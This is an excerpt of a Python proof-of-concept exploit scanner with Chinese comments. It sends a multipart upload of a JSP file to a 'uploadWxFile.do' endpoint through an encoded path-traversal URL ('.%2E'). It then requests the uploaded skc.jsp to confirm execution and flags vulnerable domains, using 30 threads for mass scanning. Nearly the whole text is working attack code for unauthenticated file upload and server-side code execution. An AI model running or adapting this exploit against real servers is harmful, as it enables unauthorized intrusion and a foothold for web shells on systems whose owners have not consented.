...
# 定义全局变量
PATH = '/trwfe/service/.%2E/config/uploadWxFile.do'
THREADS = 30  # 调整线程数


def check(domain):
    data = """------WebKitFormBoundaryaKljzbg49Mq4ggLz\r
Content-Disposition: form-data; name="file"; filename="skc.jsp"\r
Content-Type: application/octet-stream\r
\r
<% out.println("Hello, skc!"); %>\r
------WebKitFormBoundaryaKljzbg49Mq4ggLz--\r
"""
    url = domain + PATH
    poc = f'{domain}/skc.jsp'
    headers = {
    ...
    try:
        ...
        if response.status_code == 200 and 'true' in response.text:
            response1 = requests.get(url=poc, headers=headers1, timeout=3, verify=False)
            if response1.status_code==200 and 'skc' in response1.text:
                print(f'[+] {poc} 存在漏洞')
            # else:
            #     print(f'[-] {url} 不存在漏洞')
        # else:
